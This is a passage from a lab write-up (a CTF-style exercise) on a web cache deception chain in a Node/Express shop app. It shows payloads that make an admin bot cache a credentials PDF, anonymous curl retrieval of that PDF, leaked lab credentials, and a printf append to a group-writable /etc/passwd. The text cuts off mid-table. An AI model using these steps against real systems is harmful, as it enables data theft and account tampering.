@@ -1,0 +1,750 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 249 Adopting &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; Adopting</p><h1 id="249-adopting--dockerlabs-lab-249-medio">249 ADOPTING — DockerLabs lab 249 (Medio)</h1>
+<p><em>Twenty-ninth lab of the series, and the <strong>first evidence for a class the methodology does not have</strong>. The catalogue says: &quot;Máquina para practicar la vulnerabilidad cache deception, manipulación de respuestas en burp suite y escalada de privilegios en linux mediante la edición de ficheros críticos del sistema.&quot;</em></p>
+<p><strong>Result: unauthenticated disclosure of an admin-only credential report, and a working SSH shell as <code>uid=1001(pingu)</code> from it.</strong> The web half is unauthenticated end to end. The privilege escalation <strong>stops at a group-writable <code>/etc/passwd</code></strong> — I did not obtain a root shell, and §6 records the three controls that stopped me, each with a positive control.</p>
+<p><strong>The class is real and the description is accurate on all three counts</strong> — but &quot;escalada de privilegios&quot; is the one clause the lab does not deliver, and I say so explicitly in §6.1 rather than filing the <code>/etc/passwd</code> write as a root shell.</p>
+<p><strong>Reward: no <code>FLAG{}</code> exists.</strong> What exists is functional: the disclosed PDF contains a live SSH credential. §8 is the search that proves the absence.</p>
+<hr />
+<h2 id="0-the-class-gap-and-why-this-lab-is-the-wrong-shape-for-the-textbook-answer">0. The class gap, and why this lab is the wrong shape for the textbook answer</h2>
+<p>The brief asks which component holds the cache key and which routes on <code>PATH</code>, expecting a host-keyed reverse proxy in front of the app. <strong>That is not this target, and reporting it as if it were would have been the most misleading thing in this writeup.</strong></p>
+<p>The &quot;CDN&quot; is <strong>Express middleware in the same Node process as the application</strong> — <code>index.js:35</code>, <code>middleware/cache.js</code>. There is no proxy, no second host, no pivot. So:</p>
+<ul>
+<li><strong>The cache key contains no <code>Host</code> at all.</strong> <code>normalizeKey()</code> (<code>cache.js:71</code>) returns <code>path</code> + sorted non-stripped query. There is nothing to mismatch against a virtual host, because <code>Host</code> is not an input.</li>
+<li><strong>The origin routes on the full path including the extension-aware suffix</strong> (<code>/account/invoices/:id.pdf</code>), and the cache decides on <strong>the last dotted segment only</strong> (<code>pathExt()</code>, <code>cache.js:55</code>).</li>
+</ul>
+<p><strong>So the mismatch is real, but it is a suffix-vs-route mismatch inside one process, not a Host-vs-PATH mismatch across two.</strong> The generalisable rule this lab actually teaches is narrower and more portable than the one in the brief:</p>
+<blockquote>
+<p><strong>A cache is unsafe whenever its notion of &quot;the same resource&quot; is coarser than the origin's.</strong> Here the origin distinguishes &quot;invoice 1001&quot; from &quot;invoice 1002&quot;; the cache distinguishes by extension only and never varies on identity. Any two URLs that share a cacheable suffix and a normalized query are <em>one bucket</em>, regardless of who asked.</p>
+</blockquote>
+<p>That is the shape to carry to a real CDN, where the same defect arrives with <code>Host</code> in the key and a <em>path-prefix</em> mismatch instead of a suffix one. §9 states the general form.</p>
+<hr />
+<h2 id="1-surface">1. Surface</h2>
+<h3 id="11-host-and-container">1.1 Host and container</h3>
+<pre><code>$ nmap -Pn -p- --open [net-0-5]
+PORT     STATE SERVICE
+22/tcp   open  ssh
+2300/tcp open  cvmmon
+</code></pre>
+<p>Two TCP ports, both matching the image's declared metadata:</p>
+<pre><code>$ docker inspect -f &quot;ExposedPorts={{json .Config.ExposedPorts}}&quot; adopting_container
+ExposedPorts={&quot;22/tcp&quot;:{},&quot;2300/tcp&quot;:{}}
+</code></pre>
+<p><strong>UDP coverage, declared rather than assumed.</strong> <code>/proc/net/udp</code> and <code>/proc/net/udp6</code> are both <strong>empty</strong> (header row only), and the entrypoint <code>/usr/local/bin/lab-entrypoint.sh</code> starts exactly two things: <code>sshd -D -e</code> and <code>node dist/index.js</code>. <code>nmap -sU</code> was <strong>not run</strong> — it needs root, unavailable here. I am reporting the corroboration I have and declaring the gap; I am not claiming to have closed it. Consistent with <code>decision-making.md</code> §80, this target is TCP-only and the BMC/IPMI blindness does not apply.</p>
+<p><code>auto_deploy.sh</code> was <strong>read, not run</strong> (it ends in <code>while true</code>). It names <strong>one</strong> container, <strong>no</strong> <code>macvlan --internal</code> segments and <strong>no</strong> secondary networks — a single-host lab. The pivoting machinery of lab 113 has no purchase here, and I did not go looking for a second host.</p>
+<h3 id="12-topology--one-host-two-processes-and-the-decisive-fact">1.2 Topology — one host, two processes, and the decisive fact</h3>
+<pre><code>$ ps aux
+root   1  /usr/bin/dumb-init -- /usr/local/bin/lab-entrypoint.sh
+root   8  sshd: /usr/sbin/sshd -D -e [listener] 0 of 10-100 startups
+root   9  node dist/index.js          &lt;-- runs as ROOT
+</code></pre>
+<p><strong>The web application runs as <code>uid=0</code>.</strong> Measured, not assumed, from <code>/proc/9/status</code>. This matters for §6 and I flag it there rather than letting it contaminate the web findings — there is no code-execution path into it (§6.3), so it stays a property of the host and not a finding of this engagement.</p>
+<p>Stack, from the artefact: Node 20.20.2, Express 5, <code>jsonwebtoken</code>, <code>pdfkit</code>, <code>puppeteer-core</code>, <code>better-sqlite3</code>. OpenSSH_10.2, OpenSSL 3.5.6. Alpine-family base (busybox userland — see §7.2, this bit me).</p>
+<h3 id="13-the-application-map-read-before-attacking">1.3 The application map, read before attacking</h3>
+<p>Every route file, from <code>/app/server/dist</code>:</p>
+<table>
+<thead>
+<tr>
+<th>Mount</th>
+<th>Auth</th>
+<th>Cacheable?</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/api/auth</code></td>
+<td>public</td>
+<td>no</td>
+<td>register/login/me/logout</td>
+</tr>
+<tr>
+<td><code>/api/products</code></td>
+<td>public</td>
+<td>no</td>
+<td></td>
+</tr>
+<tr>
+<td><code>/api/cart</code>, <code>/api/orders</code></td>
+<td><code>requireAuth</code></td>
+<td>no</td>
+<td></td>
+</tr>
+<tr>
+<td><code>/api/support</code></td>
+<td>public to POST</td>
+<td>no</td>
+<td><strong>the victim trigger</strong></td>
+</tr>
+<tr>
+<td><code>/api/admin</code></td>
+<td><code>requireAdmin</code></td>
+<td>no</td>
+<td></td>
+</tr>
+<tr>
+<td><code>/api/_debug</code></td>
+<td><code>X-Dev-Token</code></td>
+<td>no</td>
+<td>cache dump/flush, dev token</td>
+</tr>
+<tr>
+<td><code>/account/invoices/:id.pdf</code></td>
+<td>owner or admin</td>
+<td><strong>YES</strong></td>
+<td><code>Cache-Control: private, no-store</code></td>
+</tr>
+<tr>
+<td><code>/internal/credentials-report.pdf</code></td>
+<td>admin only</td>
+<td><strong>YES</strong></td>
+<td><code>Cache-Control: private, no-store</code></td>
+</tr>
+</tbody>
+</table>
+<p>Both sensitive routes set <code>private, no-store</code> <strong>by their own admission</strong> — <code>invoices.js:33</code> and <code>internal.js:20</code>, each with a comment saying the cache ignores it. The author knew. That is the self-documenting-artefact pattern, and per <code>decision-making.md</code> §7 I treated it as a claim to be tested, not as the finding. §3 tests it.</p>
+<h3 id="14-the-cache-middleware--the-decisive-artefact-in-full">1.4 The cache middleware — the decisive artefact, in full</h3>
+<p><code>middleware/cache.js</code>, and it is short enough that the whole bug is quotable.</p>
+<p>Key construction (<code>cache.js:71-104</code>):</p>
+<pre><code class="language-js">function normalizeKey(originalUrl) {
+    const kept = [];
+    for (const part of qs.split('&amp;')) {
+        ...
+        if (shouldStrip(key))          // utm_*, or exactly: ref, cb, _, t
+            continue;
+        kept.push([rawKey, rawVal]);
+    }
+    kept.sort(...);                    // order-independent
+    if (kept.length === 0) return path;
+    return path + '?' + kept.map(...).join('&amp;');
+}
+</code></pre>
+<p>The extension rule (<code>cache.js:40-70</code>):</p>
+<pre><code class="language-js">const CACHEABLE_EXT = new Set([
+    'css','js','mjs','map','png','jpg','jpeg','gif','svg','webp','ico','avif',
+    'woff','woff2','ttf','otf','eot',
+    'pdf',                              // &lt;-- both sensitive routes end in .pdf
+    'txt','xml','mp4','webm','mp3'
+]);
+function isCacheablePath(pathname) {
+    if (pathname.startsWith('/static/')) return true;
+    const ext = pathExt(pathname);       // LAST dotted segment only
+    if (!ext) return false;
+    return CACHEABLE_EXT.has(ext);
+}
+</code></pre>
+<p>And the three decisions that make it exploitable, all in one function:</p>
+<ol>
+<li><strong>No <code>Vary</code> on anything.</strong> The middleware never reads <code>req.headers.cookie</code> or <code>req.headers.authorization</code>. <code>index.js:33</code> runs <code>authMiddleware</code> <em>before</em> it (<code>index.js:35</code>), so <code>req.user</code> is already populated when the cache sees the request — <strong>the cache had the identity in hand and did not use it.</strong> That is the whole bug in one line of reading.</li>
+<li><strong>It ignores the origin's <code>Cache-Control</code>.</strong> <code>cache.js:135</code>: <em>&quot;we DO NOT honour Cache-Control: private, no-store — that's the bug.&quot;</em></li>
+<li><strong>2xx-only storage</strong> (<code>cache.js:149</code>). This is the lab's self-imposed constraint, and it is why the attack needs a <em>victim</em> rather than just the attacker: an anonymous <code>403</code> does not poison the bucket.</li>
+</ol>
+<p>Registration order, per the lab-146 rule: <code>app.use(auth_1.authMiddleware)</code> at <code>index.js:33</code>, <code>app.use(cache_1.cacheMiddleware)</code> at <code>index.js:35</code>, routes from <code>index.js:42</code>. <strong>The cache is in front of every route, including both sensitive ones</strong>, and behind authentication. The gate is correctly placed; the cache is what defeats it.</p>
+<hr />
+<h2 id="2-the-class">2. The class</h2>
+<p><strong>Entry criterion (from the brief):</strong> <em>an attacker-chosen URL that is not an application route is nonetheless served by the application, is stored by an intermediary, and is later returned to a request the cache considers identical — crossing a trust boundary between identities.</em></p>
+<p><strong>How this target meets it, precisely:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Element</th>
+<th>Met?</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Attacker-chosen URL</td>
+<td><strong>yes</strong></td>
+<td><code>screenshot_url</code> is an unauthenticated POST field, <code>support.js:27</code></td>
+</tr>
+<tr>
+<td>…not an application route</td>
+<td><strong>partly</strong></td>
+<td>the classic <code>/x.pdf/foo.css</code> form 404s (§4.4); what deceives here is the <em>extension</em>, not the route — see below</td>
+</tr>
+<tr>
+<td>…served by the application</td>
+<td>yes</td>
+<td>origin returns the admin's 200 PDF</td>
+</tr>
+<tr>
+<td>…stored by an intermediary</td>
+<td>yes</td>
+<td><code>cache.js:159</code> <code>store.set(key, entry)</code></td>
+</tr>
+<tr>
+<td>…returned to a request the cache considers identical</td>
+<td>yes</td>
+<td><code>X-Cache: HIT</code>, <code>X-Cache-Key</code> echoed</td>
+</tr>
+<tr>
+<td><strong>crosses a trust boundary between identities</strong></td>
+<td><strong>yes</strong></td>
+<td>admin → anonymous, byte-identical (§3.2)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>The honest partial.</strong> This is web cache deception with the <em>route-confusion half absent</em>. The deception here is not &quot;a static-looking path is routed to a dynamic handler&quot; — it is &quot;a <strong>genuine</strong> dynamic route carries a cacheable extension, and the cache caches it anyway.&quot; That is a <strong>weaker precondition and a broader exposure</strong> than textbook cache deception: there is no need to find a non-route URL, because the sensitive routes <em>are</em> cacheable by their own names. §4.4 proves the textbook form does not work here, and §9 generalises both.</p>
+<p><strong>Source that settled it:</strong> <code>middleware/cache.js:40-47</code> (the list contains <code>pdf</code>), <code>:114-118</code> (the decision), <code>:159</code> (the store), and <code>invoices.js:33</code> / <code>internal.js:20</code> (the origin's ignored directive).</p>
+<hr />
+<h2 id="3-findings">3. Findings</h2>
+<h3 id="31-web-cache-deception--the-cache-key-omits-identity--cwe-524--cwe-200">3.1 Web cache deception — the cache key omits identity — CWE-524 / CWE-200</h3>
+<p><strong>The cache key is <code>path + sorted-non-stripped-query</code>. It contains no cookie, no authorization header, and no <code>Host</code>.</strong> Proven by reading <code>X-Cache-Key</code> off the wire, not by reading the source:</p>
+<pre><code>/internal/credentials-report.pdf                       -&gt; X-Cache: HIT  X-Cache-Key: /internal/credentials-report.pdf
+/internal/credentials-report.pdf?utm_source=newsletter -&gt; X-Cache: HIT  X-Cache-Key: /internal/credentials-report.pdf
+/internal/credentials-report.pdf?cb=99&amp;ref=x           -&gt; X-Cache: HIT  X-Cache-Key: /internal/credentials-report.pdf
+/internal/credentials-report.pdf?zzz=1                 -&gt; X-Cache: MISS X-Cache-Key: /internal/credentials-report.pdf?zzz=1
+</code></pre>
+<p>Three properties, each isolated by a row:</p>
+<ul>
+<li><strong><code>utm_*</code>, <code>ref</code>, <code>cb</code>, <code>_</code>, <code>t</code> are stripped</strong> — rows 1–3 collapse onto the bare path. This is <code>shouldStrip()</code>, <code>cache.js:49-54</code>.</li>
+<li><strong>A non-stripped parameter changes the key</strong> — row 4 MISSes. So the discriminator has discriminating power; the three HITs are a decision, not a broken detector.</li>
+<li><strong>Parameter order is irrelevant</strong> — <code>normalizeKey</code> sorts (<code>cache.js:100</code>), which is why <code>?cb=99&amp;ref=x</code> hits the same bucket.</li>
+</ul>
+<p><strong>And the cache does store, which is the positive control that makes every one of these HITs mean something:</strong></p>
+<pre><code>GET /static/products/pinguino1.webp  -&gt; HTTP/1.1 200  X-Cache: MISS  X-Cache-Key: /static/products/pinguino1.webp
+GET /static/products/pinguino1.webp  -&gt; HTTP/1.1 200  X-Cache: HIT   X-Cache-Key: /static/products/pinguino1.webp  Age: 0
+</code></pre>
+<p>Without this, &quot;the admin PDF came back&quot; could have been the origin serving an unauthenticated request. The static asset is the control that proves the detector fires.</p>
+<p><strong>Impact.</strong> A response the origin explicitly marked <code>private, no-store</code>, generated for one identity, is replayed verbatim to any identity that presents the same path within the TTL. Two concrete disclosures, both measured in §3.2.</p>
+<p><strong>Root cause, stated as the decision</strong> (<code>decision-making.md</code> §4). The mechanism is a missing <code>Vary</code>. The decision is: <em>serve a shared cache in front of per-identity routes, decide cacheability from a path suffix, and treat the origin's <code>private, no-store</code> as advisory.</em> Fix the suffix rule and both routes stay exposed; the fix is a <strong>denylist of paths plus mandatory origin consent</strong>:</p>
+<ol>
+<li><strong>Never store a response whose origin set <code>private</code>/<code>no-store</code>.</strong> One <code>if</code> in <code>res.end</code> closes this lab.</li>
+<li><strong>Only cache paths that are genuinely static and unauthenticated</strong> — an allowlist of asset prefixes, not a denylist of extensions.</li>
+<li><strong>Never share a bucket across identities.</strong> If a response depends on <code>req.user</code>, either do not cache it or key on the identity — the latter reintroduces the attack, so the former is the correct fix.</li>
+</ol>
+<h3 id="32-the-cross-identity-comparison--the-actual-finding-with-bytes">3.2 The cross-identity comparison — the actual finding, with bytes</h3>
+<p><strong>Setup (unauthenticated, from a cold cache).</strong> The trigger is a public POST field, <code>support.js:16-36</code>; the comment at <code>:13-14</code> states anyone may submit.</p>
+<pre><code>POST /api/support/tickets
+{&quot;subject&quot;:&quot;cache probe&quot;,&quot;message&quot;:&quot;see attachment&quot;,
+ &quot;screenshot_url&quot;:&quot;http://127.0.0.1:2300/internal/credentials-report.pdf&quot;}
+-&gt; {&quot;ticket&quot;:{&quot;id&quot;:1,&quot;subject&quot;:&quot;cache probe&quot;,&quot;status&quot;:&quot;new&quot;, ...}}
+</code></pre>
+<p>The bot — the lab's own &quot;Fraud Analyst&quot;, <code>bot/supportBot.js</code> — logs in as admin, takes the ticket, enforces same-origin (<code>isSameOrigin</code>, <code>:86</code>, which accepts <code>127.0.0.1:2300</code>), sets the <code>hb_token</code> cookie and navigates. The server's own log is the oracle that the victim identity really fetched it:</p>
+<pre><code>$ cat /app/data/bot.log
+[2026-09-29T23:57:19.589Z] VISIT ticket=1 url=http://127.0.0.1:2300/internal/credentials-report.pdf
+</code></pre>
+<p><strong>Then, with no credentials of any kind:</strong></p>
+<pre><code>$ curl -D - -o stolen.pdf http://[net-0-5]:2300/internal/credentials-report.pdf
+HTTP/1.1 200 OK
+X-Cache: HIT
+X-Cache-Key: /internal/credentials-report.pdf
+Age: 25
+Content-Type: application/pdf
+Content-Disposition: inline; filename=&quot;credentials-report.pdf&quot;
+Content-Length: 3538
+</code></pre>
+<p><strong>The byte comparison — this is the finding, and it is against the on-disk admin-only artefact:</strong></p>
+<pre><code>2314d97033b3639657947e58b149148e  /app/data/invoices/_internal-credentials-report.pdf   (measured in-container)
+2314d97033b3639657947e58b149148e  stolen.pdf                                            (anonymous, off-host)
+</code></pre>
+<p>Byte-identical to the file the origin only serves to <code>role === 'admin'</code>. And identical across <strong>three distinct requesters</strong> — the identity is not merely absent, it is irrelevant:</p>
+<table>
+<thead>
+<tr>
+<th>Requester</th>
+<th><code>X-Cache</code></th>
+<th>md5</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>no credentials at all</td>
+<td>HIT</td>
+<td><code>2314d97033b3639657947e58b149148e</code></td>
+</tr>
+<tr>
+<td>a valid-looking but <strong>bogus</strong> JWT cookie (<code>role:user</code>, bad signature)</td>
+<td>HIT</td>
+<td><code>2314d97033b3639657947e58b149148e</code></td>
+</tr>
+<tr>
+<td>a <strong>different</strong> real non-admin user</td>
+<td>HIT</td>
+<td><code>2314d97033b3639657947e58b149148e</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Contents disclosed</strong> (extracted from the stolen bytes, not from source):</p>
+<pre><code>RESTRICTED · INTERNAL ONLY · DO NOT REDISTRIBUTE
+Auditoría de Credenciales · Q2
+sftp-fotos-colonia        pingu                  chocolate
+cms-santuario             jordan.wells           lab_demo_tok_xxx
+newsletter-mailer         mailer_svc             mk_live_K7xR2mNqW9pLnotreal
+donations-stripe          webhook-processor      whsec_fakeWebhookSecret2024XY
+analytics-grafana         jordan.wells           gr@f_ops_lab_tok3n_only
+biologo-reports-s3        s3-reports-uploader    AKIAFAKEKEYNOTREAL99XZ
+</code></pre>
+<p><strong>Impact: unauthenticated disclosure of an admin-only restricted document, and — because one of its six rows is a real credential — unauthenticated remote access.</strong> That credential is not decorative; §5 spends it.</p>
+<p><strong>The second instance, and the more generalisable one.</strong> The same defect on a <em>personal</em> resource, with <strong>no bot and no admin required</strong> — any two ordinary users:</p>
+<pre><code>[1] cache flushed                                              {&quot;flushed&quot;:6}
+[2] VICTIM (nina, owner of 1001) fetches her own invoice   -&gt; 200
+[3] ATTACKER (tyler, NOT the owner) same URL              -&gt; 200
+[4] ANONYMOUS, no credentials at all                     -&gt; 200
+</code></pre>
+<p>Invoice <code>1001.pdf</code> is Nina Patel's: her name, her email, and her home address, from <code>seed.js:120-135</code>. <strong>This variant needs no privileged victim and no admin document — it is ordinary per-user data crossing between accounts</strong>, which is what makes this a systemic information-disclosure finding rather than one exotic endpoint.</p>
+<p><strong>Bounded by TTL, and I measured the bound rather than asserting it</strong> (<code>TTL_MS = 60_000</code>, <code>cache.js:33</code>):</p>
+<pre><code>t0     owner fetches 1007 -&gt; 200
+t0     anonymous  1007     -&gt; 200
+t+30s  anonymous  1007     -&gt; 200
+t+35s  anonymous  1007     -&gt; 200
+t+70s  anonymous  1007     -&gt; 403
+t+75s  anonymous  1007     -&gt; 403
+</code></pre>
+<p>A 60-second window is not a mitigation — it is a <strong>race the attacker wins by construction</strong>, because they choose when the victim visits. The bot cycles every 8 s (<code>BOT_CYCLE_MS</code>, <code>supportBot.js:27</code>), so against the admin document the window is effectively permanent.</p>
+<h3 id="33-unauthenticated-ticket-submission-used-as-a-cross-identity-primitive--cwe-306--cwe-441">3.3 Unauthenticated ticket submission used as a cross-identity primitive — CWE-306 / CWE-441</h3>
+<p><code>POST /api/support/tickets</code> (<code>support.js:16</code>) takes a <code>screenshot_url</code> and stores it, with <strong>no authentication and no validation beyond presence</strong>:</p>
+<pre><code>POST /api/support/tickets  (no cookie, no Authorization)
+-&gt; {&quot;ticket&quot;:{&quot;id&quot;:1, ...}}     200
+</code></pre>
+<p>The same-origin check exists (<code>isSameOrigin</code>, <code>supportBot.js:86</code>) but sits in the <strong>bot</strong>, not the API — and the API's own comment at <code>support.js:10-12</code> says so. Per <code>decision-making.md</code> §5 this is filed <strong>independently</strong> of §3.1, because the fix is different: authenticating or rate-limiting the endpoint closes <em>this</em>, and would not by itself close a cache that also leaks other users' invoices.</p>
+<p>Impact: any anonymous internet client can cause a <strong>privileged, cookie-bearing browser</strong> to fetch an arbitrary same-origin URL on a schedule, and can read the result whenever the cache is in the window. The bot is the amplifier that turns a cache write into a cache <em>hit</em>.</p>
+<h3 id="34-group-writable-etcpasswd--cwe-732--cwe-276">3.4 Group-writable <code>/etc/passwd</code> — CWE-732 / CWE-276</h3>
+<p>Reached as <code>pingu</code>, measured as <code>pingu</code>:</p>
+<pre><code>$ stat -c '%n mode=%a (%A) owner=%U:%G' /etc/passwd
+/etc/passwd  mode=664 (-rw-rw-r--)  owner=root:pinguinos
+$ id
+uid=1001(pingu) gid=101(pinguinos) groups=101(pinguinos)
+</code></pre>
+<p><code>pingu</code> is in the owning group, so group-write applies. <strong>And the write is real, not a permission reading</strong> — the durable state is the oracle:</p>
+<pre><code>$ printf 'w249canary:x:9999:9999:canary:/tmp:/bin/false\n' &gt;&gt; /etc/passwd   # as pingu
+$ grep -c w249canary /etc/passwd
+1
+</code></pre>
+<p>I also set <code>pingu</code>'s own uid to 0 in the file and read it back (<code>uid=0 gid=0 shell=/bin/sh</code>), and the file accepted it. <strong>What that did <em>not</em> produce is a root session</strong> — §6.1. The distinction matters and is the reason this finding is filed as &quot;critical file-write primitive, escalation incomplete&quot; rather than as a root compromise.</p>
+<p>Impact: any account in the <code>pinguinos</code> group can add, alter or remove <strong>any</strong> account — including setting arbitrary uids, changing shells, or adding a uid-0 account with a chosen password hash. The immediate escalation depends on a second condition this lab does not provide (§6.1), but the primitive is a full account-database compromise on its own, and it survives every restart.</p>
+<p><strong>Remediation:</strong> <code>chown root:root /etc/passwd &amp;&amp; chmod 644</code>. Then <code>pwck</code>, and audit the group.</p>
+<h3 id="35-debug-cache-dumpflush-gated-on-a-hardcoded-static-token--cwe-798--cwe-489">3.5 Debug cache-dump/flush gated on a hardcoded static token — CWE-798 / CWE-489</h3>
+<pre><code class="language-js">const DEV_TOKEN = process.env.DEV_DEBUG_TOKEN || 'lab-dev-flush';   // debug.js:6
+</code></pre>
+<p>The fallback is a <strong>constant in the shipped source</strong>, and the image's own environment sets it to the same value:</p>
+<pre><code>$ docker inspect -f '{{json .Config.Env}}' adopting_container
+... &quot;DEV_DEBUG_TOKEN=lab-dev-flush&quot; ...
+</code></pre>
+<p>Verified reachable, and the negative control proves the gate <em>can</em> fire (so the 200s are a decision, not a missing check):</p>
+<pre><code>POST /api/_debug/cache/flush   with    X-Dev-Token: lab-dev-flush  -&gt; 200  {&quot;flushed&quot;:6}
+POST /api/_debug/cache/flush   without X-Dev-Token                 -&gt; 401  {&quot;error&quot;:&quot;X-Dev-Token required&quot;}
+GET  /api/_debug/cache/dump    with    X-Dev-Token                 -&gt; 200  {&quot;size&quot;:…,&quot;ttl_ms&quot;:60000,&quot;entries&quot;:[…]}
+</code></pre>
+<p><strong>The dump enumerates every poisoned key</strong>, which turns a blind attack into a directed one. The source comment (<code>debug.js:15-19</code>) states this is not part of the exploit chain, and <strong>I did not use it in the chain</strong> — every finding in §3.1–3.3 was reproduced from a cold cache without it. It is filed because it ships enabled.</p>
+<p><strong>Remediation:</strong> do not ship debug routes; if they must exist, bind to loopback and authenticate with a per-deploy secret, never a source constant.</p>
+<h3 id="36-hardcoded-jwt-signing-secret-as-a-fallback--cwe-798">3.6 Hardcoded JWT signing secret as a fallback — CWE-798</h3>
+<pre><code class="language-js">const SECRET = process.env.JWT_SECRET || 'heliosbank-dev-secret-do-not-trust';   // auth.js:12
+</code></pre>
+<p><code>JWT_SECRET</code> is <strong>not</strong> in the image's environment (verified in the <code>docker inspect</code> Env dump above — only <code>DEV_DEBUG_TOKEN</code> is), so <strong>the fallback is the live secret.</strong> A JWT is HMAC-signed, not encrypted, so anyone holding the secret can mint an <code>admin</code> token offline — no password, no bot, no cache. I did not exercise it: §3.1's chain is strictly better evidence because it is a genuine cache finding, and a forged-token demonstration would have contaminated the writeup with a second, unrelated bug. Reported as a finding <strong>present but not used</strong>, in the lab-65 §3.7 sense.</p>
+<p><strong>Remediation:</strong> fail closed at startup if <code>JWT_SECRET</code> is unset; rotate the exposed value.</p>
+<h3 id="37-findings-present-but-not-used">3.7 Findings present but not used</h3>
+<ul>
+<li><strong>Forged admin JWT</strong> (<code>auth.js:12</code>) — see §3.6. Untested, deliberately.</li>
+<li><strong><code>hb_token</code> cookie is <code>httpOnly: false</code></strong> (<code>auth.js:32</code>, <code>:54</code>). Deliberate — the bot's headless browser needs to set it — and it is a real weakness, but there is no session to hijack that the cache bug does not already expose more directly.</li>
+<li><strong><code>screenshot_url</code> off-origin URLs are rejected</strong> (<code>supportBot.js:151</code>) — a control that held (§5).</li>
+<li><strong><code>/api/_debug</code> is not in the chain</strong> — filed as §3.5, unused as a tool.</li>
+</ul>
+<hr />
+<h2 id="4-the-chain">4. The chain</h2>
+<h3 id="41-measured-with-identity-at-every-hop">4.1 Measured, with identity at every hop</h3>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>→</th>
+<th>Mechanism</th>
+<th>Identity proof</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0</td>
+<td>attacker, anonymous</td>
+<td>Full TCP scan; <strong>source read first</strong> (<code>cache.js</code>, <code>invoices.js</code>, <code>internal.js</code>, <code>supportBot.js</code>)</td>
+<td>no cookie, no <code>Authorization</code> — <code>curl</code> with no session</td>
+</tr>
+<tr>
+<td>1</td>
+<td>cache stores</td>
+<td>Positive control: <code>/static/products/pinguino1.webp</code> <code>MISS</code> → <code>HIT</code></td>
+<td><code>X-Cache: HIT</code> on the second read</td>
+</tr>
+<tr>
+<td>2</td>
+<td>the trigger</td>
+<td>Unauthenticated <code>POST /api/support/tickets</code> with <code>screenshot_url</code> = the admin PDF</td>
+<td>no cookie sent; <code>support.js:16</code> has no gate</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>admin</strong></td>
+<td>Bot logs in, sets <code>hb_token</code>, navigates; origin returns 200 + the real PDF</td>
+<td><code>bot.log</code>: <code>VISIT ticket=1 url=http://127.0.0.1:2300/internal/credentials-report.pdf</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>cache poisoned</td>
+<td><code>res.end</code> monkey-patch stores the 2xx body under the normalized key</td>
+<td><code>cache.js:149-159</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td><strong>anonymous</strong></td>
+<td>Same URL, no credentials</td>
+<td><code>X-Cache: HIT</code>, <code>Age: 25</code>, md5 identical to the on-disk admin file</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>uid=1001(pingu)</code></td>
+<td>SSH with the credential <strong>extracted from the stolen PDF</strong></td>
+<td><code>id</code> → <code>uid=1001(pingu) gid=101(pinguinos)</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>uid=1001(pingu)</code></td>
+<td>Group-write to <code>/etc/passwd</code></td>
+<td><code>stat</code> = <code>664 root:pinguinos</code>; write verified durable by re-read</td>
+</tr>
+<tr>
+<td>—</td>
+<td><s>root</s></td>
+<td><strong>not reached</strong> — three controls, §6.1</td>
+<td><code>AuthenticationException</code>; <code>su: incorrect password</code>; <code>euid=1001</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Provenance of the credential is load-bearing.</strong> I extracted <code>pingu</code>/<code>chocolate</code> from <code>stolen2.pdf</code> by decompressing the PDF streams and regexing the hex-encoded <code>TJ</code> text arrays, then fed that to paramiko. The password was never read from <code>seed.js</code> to make the chain work — <code>seed.js:70</code> contains the same literal, and the two agreeing is a <em>consequence</em> of the disclosure, not the method.</p>
+<h3 id="42-cache-key-analysis-consolidated">4.2 Cache key analysis, consolidated</h3>
+<table>
+<thead>
+<tr>
+<th>Question</th>
+<th>Answer</th>
+<th>Where proven</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>What is the cache key?</td>
+<td><code>path</code> + sorted, non-stripped query string. <strong>No <code>Host</code>, no <code>Cookie</code>, no <code>Authorization</code>.</strong></td>
+<td>§3.1, <code>X-Cache-Key</code> echoed on 4 probes</td>
+</tr>
+<tr>
+<td>Which component holds it?</td>
+<td><strong>The application process itself</strong> — Express middleware, <code>index.js:35</code>. Not a proxy, not another host.</td>
+<td>§0, §1.2</td>
+</tr>
+<tr>
+<td>What is the cacheable-extension list?</td>
+<td>24 extensions including <strong><code>pdf</code></strong>, plus anything under <code>/static/</code></td>
+<td><code>cache.js:40-47</code></td>
+</tr>
+<tr>
+<td>Authenticated or anonymous?</td>
+<td><strong>The response can be either.</strong> Storage is 2xx-only, so only <em>successful</em> (i.e. authenticated) responses enter the bucket — which is exactly why a victim is required.</td>
+<td><code>cache.js:149</code></td>
+</tr>
+<tr>
+<td>Does the origin consent?</td>
+<td><strong>No.</strong> Both routes set <code>private, no-store</code>; the cache discards it.</td>
+<td><code>invoices.js:33</code>, <code>internal.js:20</code>, <code>cache.js:135</code></td>
+</tr>
+<tr>
+<td>Served to a different identity?</td>
+<td><strong>Yes</strong> — three distinct requesters, one md5.</td>
+<td>§3.2</td>
+</tr>
+<tr>
+<td>Is there a cache in the path at all?</td>
+<td><strong>Yes, but in-process.</strong> No pivot required.</td>
+<td>§0</td>
+</tr>
+</tbody>
+</table>
+<h3 id="43-what-each-step-bought">4.3 What each step bought</h3>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Bought</th>
+<th>Cost if skipped</th>
+</tr>
+</thead>
+<tbody>
+<tr>
